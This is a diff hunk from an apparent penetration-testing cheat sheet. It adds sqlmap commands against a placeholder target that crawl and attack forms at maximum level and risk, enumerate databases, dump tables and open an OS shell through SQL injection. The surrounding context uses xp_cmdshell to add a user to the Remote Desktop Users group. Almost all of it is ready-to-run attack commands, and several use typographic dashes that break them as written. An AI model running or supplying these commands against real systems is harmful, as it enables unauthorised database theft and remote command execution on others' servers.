@@ -14,6 +14,21 @@ go
 exec xp_cmdshell 'net localgroup “Remote Desktop Users” kalisa /add'
 go
 
+------------------------------
 
+SQLMAP
+# Crawl the links
+sqlmap -u http://<targetip> --crawl=1
+sqlmap -u http://<targetip> --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3
 
+# Search for databases
+sqlmap –u http://<targetip>/index.php?par= –dbs
 
+# dump tables from database 
+sqlmap –u http://<targetip>/index.php?par= –dbs –D dbname –tables –-dump
+sqlmap –u http://<targetip>/index.php?par= –dbs –D dbname –T tablename –-dump
+
+# OS Shell
+sqlmap -u http://<targetip>/comment.php?id=738 --dbms=mysql --osshell
+
+--------------------------------
